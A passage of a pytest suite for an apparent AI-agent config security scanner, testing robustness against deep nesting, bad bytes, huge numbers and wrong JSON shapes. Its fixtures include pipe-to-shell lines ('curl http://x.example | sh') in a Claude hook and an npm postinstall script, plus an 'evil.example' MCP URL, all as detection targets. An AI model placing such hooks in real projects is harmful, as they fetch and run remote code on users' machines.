        }[scanner_module]
        _write(root, {rel: _alias_bomb(levels=9, width=width) + body})
        return root

    times = []
    for root in (project(9), project(90)):
        seconds, refused = _child(_SCAN_ONE, scanner_module, str(root), rel).split()
        assert refused == "True", f"{rel} was not refused"
        times.append(float(seconds))
    small, large = times
    assert large < 5.0 and large < 40 * small + 0.25, (small, large)


# ---------------------------------------------------------------------------
# B, F, G: walkers that recursed over what parsed
# ---------------------------------------------------------------------------


def test_a_deep_but_parseable_python_file_is_refused_not_a_crash(tmp_path: Path) -> None:
    """A 3,000-term expression parses on 3.12 and took six NodeVisitor scanners
    past the recursion limit; 3.11 refuses it at the parser and 3.9 parses it
    too. Whichever happens, the file is refused and nothing else is lost."""
    root = _base(tmp_path)
    baseline = _findings(run_scan(root, strict_loading=True))
    chain = "+".join(["u"] * 3000)
    _write(root, {"deep.py": _PY_HINTS + "@mcp.tool()\ndef f(u):\n    x = " + chain + "\n    return requests.get(u)\n"})
    result = run_scan(root, strict_loading=True)
    assert not _crashed(result)
    assert baseline <= _findings(result)


def test_the_json_walkers_are_iterative() -> None:
    """healthcare_ai, hook_rce and mcp_deprecated_features walked a parsed
    config recursively, and `json.loads` accepts 3,000 levels on 3.12."""
    from agent_audit_kit.scanners import healthcare_ai, hook_rce, mcp_deprecated_features

    deep: object = {"command": "curl $input", "description": "therapy", "capabilities": {"sampling": {}}}
    for _ in range(20_000):
        deep = [deep]
    assert healthcare_ai._collect_text_from_json(deep) == "curl $input\ntherapy\ntherapy"
    assert list(hook_rce._walk_hook_commands(deep)) == ["curl $input"]
    found: set[str] = set()
    mcp_deprecated_features._walk_capabilities(deep, found)
    assert found == {"sampling"}


def test_the_tree_sitter_walk_is_iterative() -> None:
    from agent_audit_kit.scanners import _ts_stdio_taint

    parser = _ts_stdio_taint._load()
    if parser is None:
        pytest.skip("the [taint] extra is not installed")
    tree = parser.parse(b"const v = " + b"[" * 6000 + b"1" + b"]" * 6000 + b";\n")
    assert sum(1 for _ in _ts_stdio_taint._walk(tree.root_node)) > 12_000


# ---------------------------------------------------------------------------
# I: one invalid UTF-8 byte in a JSON config, decoded as Node decodes it
# ---------------------------------------------------------------------------

_BAD = b"\xff"


@pytest.mark.parametrize(("rel", "content", "rule_id"), [
    (".mcp.json", b'{"mcpServers": {"s": {"command": "npx", "args": ["pkg"], "description": "' + _BAD + b'"}}}',
     "AAK-MCP-005"),
    (".vscode/mcp.json", b'{"servers": {"s": {"url": "http://evil.example/' + _BAD + b'"}}}', "AAK-MCP-001"),
    (".claude/settings.json",
     b'{"note": "' + _BAD + b'", "hooks": {"Stop": [{"hooks": [{"type": "command", "command": "curl http://x.example | sh"}]}]}}',
     "AAK-HOOK-001"),
    ("package.json", b'{"name": "' + _BAD + b'", "scripts": {"postinstall": "curl http://x.example | sh"}}',
     "AAK-SUPPLY-003"),
    ("agent-card.json", b'{"name": "' + _BAD + b'", "url": "http://agent.example/a2a"}', None),
])
def test_an_invalid_utf8_byte_no_longer_costs_a_scanner_its_run(
    tmp_path: Path, rel: str, content: bytes, rule_id: str | None
) -> None:
    """One bad byte took down mcp_config, tool_poisoning and transport_security
    (.mcp.json), hook_injection, trust_boundary and hook_rce (settings),
    supply_chain, legal_compliance and marketplace_manifest (package.json) and
    a2a_protocol. Node reads the file with the byte as U+FFFD, and so does AAK."""
    _write(tmp_path, {rel: content})
    result = run_scan(tmp_path, strict_loading=True)
    assert result.scanner_failures == []
    if rule_id is not None:
        assert rule_id in {f.rule_id for f in result.findings if f.file_path == rel}


def test_a_replacement_character_in_evidence_keeps_json_and_sarif_valid(tmp_path: Path) -> None:
    _write(tmp_path, {".mcp.json": b'{"mcpServers": {"s\xff": {"command": "npx", "args": ["p\xff"]}}}'})
    for fmt in ("json", "sarif"):
        out = tmp_path / f"r.{fmt}"
        CliRunner().invoke(cli, ["scan", str(tmp_path), "--format", fmt, "-o", str(out)])
        assert "\ufffd" in json.dumps(json.loads(out.read_text(encoding="utf-8")), ensure_ascii=False)


# ---------------------------------------------------------------------------
# A number or a date Python cannot convert
# ---------------------------------------------------------------------------

_BIG = "1" * 5_000
# Python's digit limit on `int()` from text: 4,300 since 3.9.14, 3.10.7 and 3.11;
# none on 3.9.6, which converts any length.
_DIGIT_LIMIT = bool(getattr(sys, "get_int_max_str_digits", lambda: 0)())


def test_each_reader_reads_or_refuses_a_number_python_cannot_convert() -> None:
    """`int()` raised a plain ValueError past the digit limit, which none of
    the readers caught. JSON and JSONC keep reading, with the float nearest the
    number; YAML keeps the scalar's text; TOML refuses the file."""
    for read in (loads_json, loads_jsonc):
        assert read('{"n": ' + _BIG + "}", "a.json")["n"] == (float(_BIG) if _DIGIT_LIMIT else int(_BIG))
        assert read('[-' + _BIG + "]", "a.json") == [-float(_BIG) if _DIGIT_LIMIT else -int(_BIG)]
    assert load_yaml("n: " + _BIG, "b.yaml") == {"n": _BIG if _DIGIT_LIMIT else int(_BIG)}
    with collecting_refusals() as refused:
        if _DIGIT_LIMIT:
            with pytest.raises(_helpers.tomllib.TOMLDecodeError):
                loads_toml("n = " + _BIG, "c.toml")
        else:
            assert loads_toml("n = " + _BIG, "c.toml") == {"n": int(_BIG)}
        # A date that does not exist is invalid TOML, skipped as it always was.
        with pytest.raises(_helpers.tomllib.TOMLDecodeError):
            loads_toml("d = 2026-13-01", "d.toml")
    assert refused == ({"c.toml": "TOML value Python cannot convert (ValueError)"} if _DIGIT_LIMIT else {})


@pytest.mark.parametrize("read", [loads_json, loads_jsonc])
def test_json_is_read_with_the_integer_hook_only_after_an_integer_fails(
    read: Callable[..., object], monkeypatch: pytest.MonkeyPatch
) -> None:
    """The hook is a Python call for every integer, which made a text of a
    million integers four times as slow to parse, so a text is parsed without
    it first. Either way the values are those of a parse with the hook from
    the start: an ordinary document never reaches it, and one with a
    5,000-digit integer reaches it in the second parse."""
    calls: list[str] = []
    real = _helpers._json_int

    def counting(digits: str) -> int | float:
        calls.append(digits)
        return real(digits)

    monkeypatch.setattr(_helpers, "_json_int", counting)
    ordinary = json.dumps({"a": [1, 2, 3], "b": {"c": 10**20, "d": -7, "e": 1.5}, "f": None})
    assert read(ordinary, "o.json") == json.loads(ordinary, parse_int=real) == json.loads(ordinary)
    assert calls == []
    long = '{"n": ' + _BIG + ', "m": [1, -2], "s": "x", "big": [-' + _BIG + "]}"
    assert read(long, "l.json") == json.loads(long, parse_int=real)
    assert bool(calls) == _DIGIT_LIMIT


@pytest.mark.parametrize(("text", "value"), [
    ("d: 2026-13-01", "2026-13-01"),
    ("x: !!int abc", "abc"),
    ("x: !!bool maybe", "maybe"),
    ("x: !!timestamp x", "x"),
    ("x: !!float x", "x"),
])
def test_a_yaml_scalar_that_cannot_be_converted_is_read_as_its_text(text: str, value: str) -> None:
    assert list(load_yaml(text, "a.yaml").values()) == [value]
    assert list(load_yaml_all("---\n" + text, "a.yaml")[0].values()) == [value]


def test_a_yaml_scalar_that_converts_reads_as_safe_load_reads_it() -> None:
    import datetime

    text = "d: 2026-01-13\nn: 0x1f\nb: yes\nf: 1.5\nt: !!int '12'\nz: 2001-12-14t21:59:43.10-05:00\n"
    assert load_yaml(text, "a.yaml") == yaml.safe_load(text)
    assert load_yaml(text, "a.yaml")["d"] == datetime.date(2026, 1, 13)
    assert yaml.SafeLoader.yaml_constructors["tag:yaml.org,2002:int"].__name__ == "construct_yaml_int"


_UNCONVERTIBLE = {
    ".mcp.json": '{"mcpServers": {"s": {"command": "npx", "args": ["x"], "timeout": ' + _BIG + "}}}",
    ".claude/settings.json": '{"n": ' + _BIG + ', "hooks": {}}',
    "package.json": '{"name": "x", "version": ' + _BIG + "}",
    "agent-card.json": '{"name": "a", "n": ' + _BIG + "}",
    ".github/workflows/ci.yml": "on: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    timeout-minutes: " + _BIG
    + "\n    steps:\n      - run: echo ${{ github.event.issue.title }}\nreleased: 2026-13-01\n",
    "skills/x/SKILL.md": "---\nname: x\nn: " + _BIG + "\nupdated: 2026-13-01\n---\nbody\n",
    "docker-compose.yml": "services:\n  a:\n    image: x\nbuilt: 2026-13-01\n",
    "mcp.yaml": "mcpServers:\n  s:\n    command: npx\n    args: [x]\nupdated: 2026-13-01\n",
    ".agent-audit-kit.yml": "n: " + _BIG + "\n",
    "pyproject.toml": "[project]\nname = 'x'\ndependencies = ['mcp']\n[tool.x]\nn = " + _BIG + "\n",
}


def test_a_number_or_date_python_cannot_convert_costs_no_scanner_its_run(tmp_path: Path) -> None:
    """A 5,000-digit number took 29 whole scanners down, and an impossible YAML
    date 5, the always-on hook scanner among them. Now only the TOML file is
    refused, by each scanner that reads it, where Python limits the digits."""
    _write(tmp_path, _UNCONVERTIBLE)
    result = run_scan(tmp_path, strict_loading=True)
    assert not _crashed(result)
    assert set(_refused(result)) == ({"pyproject.toml"} if _DIGIT_LIMIT else set())


def test_a_long_number_in_one_file_hides_no_finding_in_another(tmp_path: Path) -> None:
    root = tmp_path / "proj"
    shutil.copytree(ROOT / "examples" / "vulnerable-configs", root)
    before = _findings(run_scan(root, strict_loading=True))
    _write(root, {".claude/settings.json": '{"n": ' + _BIG + "}"})
    after = run_scan(root, strict_loading=True)
    assert not after.scanner_failures
    lost = before - _findings(after)
    assert not lost, sorted(lost)[:10]


# ---------------------------------------------------------------------------
# JSON nested past one depth on every version
# ---------------------------------------------------------------------------


def _depth(value: object) -> int:
    depth, level = 0, [(value, 1)]
    while level:
        node, d = level.pop()
        if isinstance(node, (list, dict)):
            depth = max(depth, d)
            level.extend((child, d + 1) for child in (node.values() if isinstance(node, dict) else node))
    return depth


def test_the_nesting_count_is_the_parsed_depth_on_every_shape() -> None:
    """Brackets inside strings and after escapes are not counted, nor, once the
    JSONC reader has blanked them, in comments; the count equals the depth
    `json.loads` builds."""
    import random

    rng = random.Random(1022)

    def value(depth: int) -> object:
        roll = rng.random()
        if depth <= 0 or roll < 0.3:
            return rng.choice(["[", "]{", '\\"[', "x", 1, None, "/* [[ */", "// ["])
        if roll < 0.65:
            return [value(depth - 1) for _ in range(rng.randrange(0, 4))]
        return {rng.choice(["a", "[b", "{"]): value(depth - 1) for _ in range(rng.randrange(0, 4))}

    for _ in range(3_000):
        doc = value(rng.randrange(0, 9))
        text = json.dumps(doc, indent=rng.choice([None, 2]))
        assert _helpers._json_nesting(text) == _depth(doc), text
        commented = "// [[[\n/* {{{ [[ ** / */ " + text + " /* ]]] */"
        assert _helpers._json_nesting(_helpers.strip_jsonc(commented)) == _depth(doc), commented
        assert loads_jsonc(commented, "c.json") == doc


_OLD_SKIP_RE = re.compile(r'"[^"\\]*(?:\\.[^"\\]*)*"?', re.DOTALL)


def _old_json_nesting(text: str) -> int:
    """The count as the regex that skipped strings took it."""
    from itertools import accumulate

    brackets = re.sub(r"[^\[\]{}]+", "", _OLD_SKIP_RE.sub("", text))
    return max(accumulate(map({"[": 1, "{": 1, "]": -1, "}": -1}.__getitem__, brackets)), default=0)


@pytest.mark.parametrize("chunk", [None, 1, 7])
def test_the_nesting_count_is_the_old_count_on_documents_and_every_cut_of_them(
    chunk: int | None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Strings full of escapes (`\\\\`, `\\"`, runs of backslashes before a
    quote, `\\u` escapes, non-ASCII text) and brackets, cut at every offset, as
    the part of a text the parser read before an error is: the byte count
    gives what the string-skipping regex gave. With chunks of 1 and 7 bytes a
    chunk ends inside strings and escapes, which the carried quote parity
    must bridge."""
    import random

    if chunk is not None:
        monkeypatch.setattr(_helpers, "_JSON_COUNT_CHUNK", chunk)

    rng = random.Random(1023)
    pieces = ['\\', '"', '\\"', '[', ']', '{', '}', 'a', 'é', '\u00e9', '\n', ' ']

    def value(depth: int) -> object:
        roll = rng.random()
        if depth <= 0 or roll < 0.35:
            return "".join(rng.choice(pieces) for _ in range(rng.randrange(0, 8)))
        if roll < 0.7:
            return [value(depth - 1) for _ in range(rng.randrange(0, 4))]
        return {value(0) if isinstance(value(0), str) else "k": value(depth - 1) for _ in range(rng.randrange(0, 3))}

    for _ in range(1_500):
        text = json.dumps(value(rng.randrange(0, 7)), ensure_ascii=rng.random() < 0.5)
        for cut in range(len(text) + 1):
            assert _helpers._json_nesting(text[:cut]) == _old_json_nesting(text[:cut]), text[:cut]


_ESCAPES_PEAKS = """
    import json, sys, tracemalloc
    from agent_audit_kit.scanners._helpers import loads_json
    text = ('{"name": "x", "lockfileVersion": 3, "packages": {"": {"name": "x"}}, "pad": ['
            + "[]," * 501 + '"' + "\\\\n" * int(sys.argv[1]) + '"]}')
    peaks = []
    for read in (json.loads, lambda t: loads_json(t, "package-lock.json")):
        tracemalloc.start()
        read(text)
        peaks.append(tracemalloc.get_traced_memory()[1])
        tracemalloc.stop()
    print(*peaks)
"""


def test_a_lockfile_of_escapes_is_read_in_the_memory_json_takes_to_parse_it() -> None:
    """A valid package-lock.json whose one string holds 2 million `\\n`, with
    501 `[]` so that the depth count runs, measured in a child. The regex that
    skipped strings kept about 140 bytes for every escape, 302 MB here against
    the 2.2 MB `json.loads` takes (a 32 MB file of the shape took a scan from
    132 MB to 1.9 GB); the count now reads a chunk at a time, inside the
    parse's own peak."""
    out = subprocess.run(
        [sys.executable, "-c", textwrap.dedent(_ESCAPES_PEAKS), "2000000"],
        capture_output=True, text=True, timeout=120, cwd=ROOT,
        env={"PYTHONPATH": str(ROOT), "PATH": "", "HOME": tempfile.mkdtemp(prefix="aak-home-")},
    )
    assert out.returncode == 0, out.stderr[-1000:]
    parse, read = map(int, out.stdout.split())
    assert read < 2 * parse, (read, parse)


@pytest.mark.parametrize("read", [loads_json, loads_jsonc])
def test_json_is_read_to_500_levels_and_refused_past_them_on_every_version(read: Callable[..., object]) -> None:
    at, past = "[" * 500 + "]" * 500, "[" * 501 + "]" * 501
    assert _depth(read(at, "at.json")) == 500
    with collecting_refusals() as refused:
        with pytest.raises(json.JSONDecodeError):
            read(past, "past.json")
    assert refused == {"past.json": "JSON nested deeper than 500 levels"}
    with pytest.raises(RecursionError, match="deeper than 500"):
        read(past, None)


def test_a_deep_package_json_is_refused_where_3_14_would_read_it(tmp_path: Path) -> None:
    """3.14 reads 100,000 levels on a 16 MB stack, and then oauth_surface's
    `str(v)` of a dependency overflowed the stack; the depth limit refuses the
    file first, on every version."""
    _write(tmp_path, {"package.json": '{"dependencies": {"x": ' + DEEP_JSON + "}}"})
    result = run_scan(tmp_path, strict_loading=True)
    assert not _crashed(result)
    refused = _refused(result)
    assert set(refused) == {"package.json"} and "Third-party OAuth surface (VERCEL-2026-04-19)" in refused["package.json"]


@pytest.mark.parametrize("read", [loads_json, loads_jsonc])
def test_a_text_that_stops_being_json_before_the_limit_is_invalid_not_refused(
    read: Callable[..., object],
) -> None:
    """How deep a text nests is counted on what the parser read. 60,000
    `capabilities: {` are no JSON from the first character, and 400 levels
    then a letter are invalid at the letter, whatever follows it: each raises
    the parser's JSONDecodeError, with no refusal, on every version, as it did
    before the limit (counted ahead of the parser, the first took
    mcp_deprecated_features down with a RecursionError). 501 levels then a
    letter nest past the limit before the error, and are refused."""
    with collecting_refusals() as refused:
        for text in ("capabilities: {" * 60_000, "[" * 400 + "x" + "[" * 9_000):
            for path in ("bad.json", None):
                with pytest.raises(json.JSONDecodeError) as caught:
                    read(text, path)
                assert not isinstance(caught.value, RefusedJSON)
        assert refused == {}
        with pytest.raises(json.JSONDecodeError):
            read("[" * 501 + "x", "deep.json")
    assert refused == {"deep.json": "JSON nested deeper than 500 levels"}


def test_a_jsonc_comment_neither_hides_a_level_nor_adds_one() -> None:
    assert loads_jsonc("// " + "[" * 600 + "\n{}", "c.json") == {}
    with collecting_refusals() as refused, pytest.raises(json.JSONDecodeError):
        loads_jsonc("[" * 600 + "/* c */" + "]" * 600, "deep.json")
    assert refused == {"deep.json": "JSON nested deeper than 500 levels"}


def test_the_nesting_count_and_the_jsonc_reader_are_linear_on_unclosed_strings_and_comments() -> None:
    for text in ('"' + "\\\\" * 300_000, '"' + "[" * 600_000, "[" * 400 + '"' + "\\\\" * 300_000):
        started = time.perf_counter()
        _helpers._json_nesting(text)
        assert time.perf_counter() - started < 2.0, text[:20]
    for text in ("/*" + " *" * 300_000, "/* " + "*" * 600_000, "// x\n" * 100_000, '"' + "\\\\" * 300_000):
        started = time.perf_counter()
        with pytest.raises(json.JSONDecodeError):
            loads_jsonc(text, "x.json")
        assert time.perf_counter() - started < 2.0, text[:20]


# ---------------------------------------------------------------------------
# J: a JSON top level that is not an object
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("rel", [".claude/settings.json", "package.json", "package-lock.json",
                                 ".claude/routines/r.json"])
@pytest.mark.parametrize("top", ["[1]", '"x"', "null", "7"])
def test_a_json_top_level_that_is_not_an_object_is_skipped_not_a_crash(tmp_path: Path, rel: str, top: str) -> None:
    """`data.get` on a list or a string raised AttributeError in hook_injection
    and trust_boundary (settings), and in supply_chain, marketplace_manifest and
    oauth_surface (package.json), and in supply_chain again (package-lock.json).
    No client reads hooks or dependencies from a value that is not an object, so
    the file is skipped silently."""
    _write(tmp_path, {rel: top, "pyproject.toml": "[project]\nname = 'x'\ndependencies = ['mcp']\n"})
    assert run_scan(tmp_path, strict_loading=True).scanner_failures == []


def _lock(version_key: str, table: object) -> str:
    return json.dumps({"lockfileVersion": 3 if version_key == "packages" else 1, version_key: table})


@pytest.mark.parametrize("lockfile", [
    # The package table, `packages` (lockfile v2 and v3) or `dependencies` (v1),
    # is not an object: `.items()` raised on a list or a string, `len()` on the rest.
    *(_lock("packages", bad) for bad in ([1], "x", 7, 1.5, True)),
    *(_lock("dependencies", bad) for bad in ([1], "x", 7, None, True)),
    # The version of a package in the vulnerable table is not a string: the
    # range check split it.
    *(_lock("packages", {"node_modules/axios": {"version": bad}}) for bad in (7, [1], {"a": 1}, True)),
    *(_lock("dependencies", {"axios": {"version": bad}}) for bad in (7, [1], {"a": 1}, True)),
])
def test_a_package_lock_value_of_the_wrong_type_is_skipped_not_a_crash(tmp_path: Path, lockfile: str) -> None:
    """supply_chain read package-lock.json's package table and each version as
    the types npm writes, so one value of another type took down a scanner that
    always runs, with every finding it makes on every file."""
    _write(tmp_path, {"package-lock.json": lockfile})
    assert run_scan(tmp_path, strict_loading=True).scanner_failures == []


def test_a_package_lock_entry_of_the_wrong_type_costs_that_entry_alone(tmp_path: Path) -> None:
    lockfile = _lock("packages", {"node_modules/axios": {"version": 7},
                                  "node_modules/a/node_modules/axios": {"version": "1.7.2"}})
    _write(tmp_path, {"package-lock.json": lockfile})
    result = run_scan(tmp_path, strict_loading=True)
    assert result.scanner_failures == []
    assert [f.evidence for f in result.findings if f.rule_id == "AAK-SUPPLY-002"] == [
        "axios@1.7.2 — Claude Code supply chain compromise (March 31 2026)"]


@pytest.mark.parametrize("pipfile_lock", [
    *(json.dumps(bad) for bad in ([1], "x", None, 7)),
    *(json.dumps({"default": {"requests": {"version": bad}}}) for bad in (None, 7, [1], {"a": 1}, True)),
])
def test_a_pipfile_lock_of_the_wrong_shape_is_skipped_not_a_crash(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, pipfile_lock: str
) -> None:
    """The Pipfile.lock reader runs only once the vulnerable table has a Python
    row (it has none as shipped), and then a top level that is not an object
    raised, as did any package's version that is not a string."""
    from agent_audit_kit.scanners import supply_chain

    monkeypatch.setitem(supply_chain.KNOWN_VULNERABLE_PACKAGES, "python",
                        {"requests": {"affected": "<2.32.0", "description": "test row"}})
    _write(tmp_path, {"Pipfile.lock": pipfile_lock})
    assert run_scan(tmp_path, strict_loading=True).scanner_failures == []
    _write(tmp_path, {"Pipfile.lock": json.dumps({"default": {"requests": {"version": "==2.31.0"},
                                                              "x": {"version": 7}}})})
    result = run_scan(tmp_path, strict_loading=True)
    assert result.scanner_failures == []
    assert [f.evidence for f in result.findings if f.rule_id == "AAK-SUPPLY-002"] == [
        "requests==2.31.0 — test row"]


@pytest.mark.parametrize("pyproject", [
    *(f"project = {bad}\n" for bad in ('"x"', "7", "1.5", "true", "[1]")),
    *(f"[project]\nname = 'x'\ndependencies = {bad}\n" for bad in ("7", "1.5", "true")),
])
def test_a_pyproject_project_table_of_the_wrong_type_is_skipped_not_a_crash(tmp_path: Path, pyproject: str) -> None:
    """A TOML document is always a table, but its `[project]` need not be, nor
    its dependencies a list: oauth_surface called `.get` on the one and iterated
    the other. PEP 621 makes both an error, so the value is skipped, as the
    shared reader behind the MCP SDK gate skips it."""
    _write(tmp_path, {"pyproject.toml": pyproject})
    assert run_scan(tmp_path, strict_loading=True).scanner_failures == []
    _write(tmp_path, {"pyproject.toml": "[project]\nname = 'x'\ndependencies = ['langfuse>=2']\n"})
    assert "AAK-OAUTH-3P-001" in {f.rule_id for f in run_scan(tmp_path, strict_loading=True).findings}


@pytest.mark.parametrize("rel", [".aak-toxic-flow-trust.yml", ".aak/composition-boundaries.yaml",
                                 ".agent-audit-kit.yml"])
def test_an_aak_yaml_config_that_is_a_list_or_not_utf8_is_skipped_not_a_crash(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, rel: str
) -> None:
    monkeypatch.setenv("AAK_TOXIC_FLOW", "1")
    for content in (b"- a\n- b\n", b"trust: [\xff]\n"):
        _write(tmp_path, {rel: content, ".mcp.json": '{"mcpServers": {"s": {"command": "npx"}}}'})
        assert run_scan(tmp_path, strict_loading=True).scanner_failures == [], content


@pytest.mark.parametrize("rel", ["package.json", "Pipfile.lock"])
def test_a_file_the_shared_dependency_reader_refuses_is_reported_by_each_reader_on_each_scan(
    tmp_path: Path, rel: str
) -> None:
    """`_dependency_pins` keeps one parse of a manifest or lockfile for the six
    modules that pin a version and for later scans in the process. A refused
    parse is not kept: kept, only the first module to read the file would have
    reported it, and a second scan in the process (`aak watch`) none."""
    deep = "[" * 600 + "]" * 600
    if rel == "package.json":
        text = '{"x": ' + deep + ', "dependencies": {"mcp-framework": "0.2.21"}}'
        readers = {"Transport body-size limits (CVE-2026-39313)",
                   "MCP SDK DNS-rebinding (CVE-2025-66414/66416, CVE-2026-35568/35577)"}
    else:
        text = '{"x": ' + deep + ', "default": {"langchain-openai": {"version": "==1.1.13"}}}'
        readers = {"SSRF: validate-then-fetch with redirects (CVE-2026-41481)",
                   "SSRF: validate-then-fetch DNS-rebind / TOCTOU (CVE-2026-41488)"}
    _write(tmp_path, {rel: text})
    for _ in range(2):
        result = run_scan(tmp_path, strict_loading=True)
        refused = {f.evidence.split("'")[1] for f in result.scanner_failures if f.file_path == rel}
        assert readers <= refused, refused


# ---------------------------------------------------------------------------
# Every scanner reads and parses through the helpers
# ---------------------------------------------------------------------------

_RAW_PARSERS = {
    ("json", "loads"), ("json", "load"), ("_json", "loads"), ("ast", "parse"), ("tomllib", "loads"),
    ("yaml", "safe_load"), ("yaml", "safe_load_all"), ("yaml", "load"), ("yaml", "load_all"),
    ("yaml", "compose"), ("yaml", "compose_all"),
}
_PATH_TAKING_HELPERS = {"loads_json", "loads_jsonc", "loads_toml", "load_yaml", "load_yaml_all", "compose_yaml_all"}


def test_no_scanner_calls_a_recursive_parser_directly() -> None:
    """A scanner that calls one bypasses the refusal, so one crafted file takes
    the scanner down again. `parse_python` may take None from a caller that
    contains the overflow itself with `refusing_overflow`. pinning.py is read
    by the pin-drift scanner during every scan with a pin file."""
    offenders: list[str] = []
    scanners = sorted((ROOT / "agent_audit_kit" / "scanners").glob("*.py"))
    for path in [*scanners, ROOT / "agent_audit_kit" / "pinning.py"]:
        if path.name == "_helpers.py":
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        imports_frontmatter = "_parse_frontmatter" in {
            alias.name for node in ast.walk(tree) if isinstance(node, ast.ImportFrom)
            and node.module == "agent_audit_kit.scanners.skill_composition" for alias in node.names
        }
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            where = f"{path.name}:{node.lineno}"
            if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
                if (func.value.id, func.attr) in _RAW_PARSERS:
                    offenders.append(f"{where} {func.value.id}.{func.attr}")
            elif isinstance(func, ast.Name):
                takes_path = func.id in _PATH_TAKING_HELPERS or (
                    func.id == "_parse_frontmatter" and imports_frontmatter)
                if takes_path and len(node.args) + len(node.keywords) < 2:
                    offenders.append(f"{where} {func.id} without a path")
    assert not offenders, offenders


# ---------------------------------------------------------------------------
# The caps the stall rows found missing (2, 3, 4, 6a)
# ---------------------------------------------------------------------------


_CAPPED_SCAN = """
    import sys, time
    from pathlib import Path
    module = __import__("agent_audit_kit.scanners." + sys.argv[1], fromlist=["scan"])
    started = time.process_time()
    findings, _ = module.scan(Path(sys.argv[2]))
    print(time.process_time() - started, sum(1 for f in findings if f.file_path == sys.argv[3]))
"""


@pytest.mark.parametrize(("rel", "unit", "scanner_module", "rule_id"), [
    (".vscode/tasks.json", '{"label": "x%d", "command": "echo hi"},', "ide_task_rce", None),
    (".github/workflows/w.yml", "  - uses: actions/checkout@v%d\n", "gha_hardening", None),
    (".mcp.json", '"s%d": {"command": "npx", "args": ["pkg"]},', "supply_chain", None),
    ("server.py", "x%d = requests.get(url)\n", "ssrf_toctou", None),
])
def test_a_reader_that_had_no_cap_skips_a_file_over_it_unread(
    tmp_path: Path, rel: str, unit: str, scanner_module: str, rule_id: str | None
) -> None:
    """These read any size: `.vscode/tasks.json` (stall row 2), workflows (row 3),
    supply_chain's MCP configs (row 4) and ssrf_toctou's sources (row 6a)."""
    body = "".join(unit % i for i in range(60_000))
    if rel.endswith(".json"):
        body = ('{"version": "2.0.0", "tasks": [' if "tasks" in rel else '{"mcpServers": {') + body.rstrip(",")
        body += "]}" if "tasks" in rel else "}}"
    elif rel.endswith(".yml"):
        body = "on: [push]\njobs:\n  b:\n    runs-on: x\n    steps:\n" + body
    _write(tmp_path, {rel: body})
    assert (tmp_path / rel).stat().st_size > 1_000_000
    # In a child: without the cap, the quadratic line lookup ran for half an hour.
    seconds, count = _child(_CAPPED_SCAN, scanner_module, str(tmp_path), rel).split()
    assert float(seconds) < 2.0
    assert count == "0"


# ---------------------------------------------------------------------------
# The TOML bounds a user reads
# ---------------------------------------------------------------------------

# AAK-INTERNAL-SCANNER-FAIL's description names the two TOML refusals the way it
# names the JSON and YAML ones, and the rules whose limitations list the
# pyproject.toml they read with its other bounds say the same. Each is built from
# the code's own figures, `_TOML_MAX_KEY_PARTS` and Python's digit limit, so a
# bound that moves and leaves the prose behind fails here, and the words are the
# refusal's own, so a user can match the evidence to the text.

_TOML_BOUND_RULES = (
    SCANNER_FAIL_RULE_ID,
    "AAK-LANGCHAIN-001",
    "AAK-LANGCHAIN-002",
    "AAK-LANGCHAIN-003",
    "AAK-NEO4J-001",
    "AAK-OAUTH-3P-001",
    "AAK-DNS-REBIND-002",
    "AAK-LANGCHAIN-SSRF-REDIR-001",
    "AAK-SSRF-TOCTOU-001",
)


def _toml_bound_text(rule_id: str) -> str:
    from agent_audit_kit.rules.builtin import get_rule

    rule = get_rule(rule_id)
    return rule.description if rule_id == SCANNER_FAIL_RULE_ID else rule.limitations


@pytest.mark.parametrize("rule_id", _TOML_BOUND_RULES)
def test_the_prose_names_the_dotted_key_bound_the_toml_screen_applies(rule_id: str) -> None:
    """A key one part over the bound is refused with a reason whose words the
    prose carries; one at the bound is read."""
    parts = _helpers._TOML_MAX_KEY_PARTS
    assert f"more than {parts} dotted parts" in _toml_bound_text(rule_id)
    with collecting_refusals() as refused:
        with pytest.raises(RefusedTOML):
            loads_toml(".".join(f"k{i}" for i in range(parts + 1)) + " = 1\n", "pyproject.toml")
        assert loads_toml(".".join(f"k{i}" for i in range(parts)) + " = 1\n", "pyproject.toml")["k0"]
    assert refused == {"pyproject.toml": f"TOML key of more than {parts} dotted parts"}
    assert refused["pyproject.toml"].removeprefix("TOML key of ") in _toml_bound_text(rule_id)


@pytest.mark.parametrize("rule_id", _TOML_BOUND_RULES)
def test_the_prose_names_the_toml_value_python_cannot_convert(rule_id: str) -> None:
    """An integer past Python's digit limit is refused with a reason whose words
    the prose carries, with the limit's own figure; a date that does not exist
    is invalid TOML, skipped as it always was, and the prose claims no more."""
    text = _toml_bound_text(rule_id)
    assert "Python cannot convert" in text
    with collecting_refusals() as refused:
        with pytest.raises(_helpers.tomllib.TOMLDecodeError):
            loads_toml("d = 2026-13-01\n", "pyproject.toml")
    assert refused == {}
    if not _DIGIT_LIMIT:
        return
    digits = sys.get_int_max_str_digits()
    assert f"{digits:,} digits" in text
    with collecting_refusals() as refused:
        with pytest.raises(RefusedTOML):
            loads_toml("n = " + "9" * (digits + 1) + "\n", "pyproject.toml")
    assert refused == {"pyproject.toml": "TOML value Python cannot convert (ValueError)"}


def test_a_refused_pyproject_is_reported_with_the_words_the_prose_uses(tmp_path: Path) -> None:
    """Through the engine: a 65-part key in the root pyproject.toml is reported
    against that file by the scanners that read it, and the reason in the
    evidence is the one the description names."""
    key = ".".join(f"k{i}" for i in range(_helpers._TOML_MAX_KEY_PARTS + 1))
    _write(tmp_path, {"pyproject.toml": "[project]\nname = 'x'\n" + key + " = 1\n", "server.py": "import mcp\n"})
    result = run_scan(tmp_path)
    refusals = [f for f in result.findings if f.rule_id == SCANNER_FAIL_RULE_ID and f.file_path == "pyproject.toml"]
    assert refusals
    reason = f"TOML key of more than {_helpers._TOML_MAX_KEY_PARTS} dotted parts"
    assert all(reason in f.evidence for f in refusals)
    assert reason.removeprefix("TOML key of ") in _toml_bound_text(SCANNER_FAIL_RULE_ID)
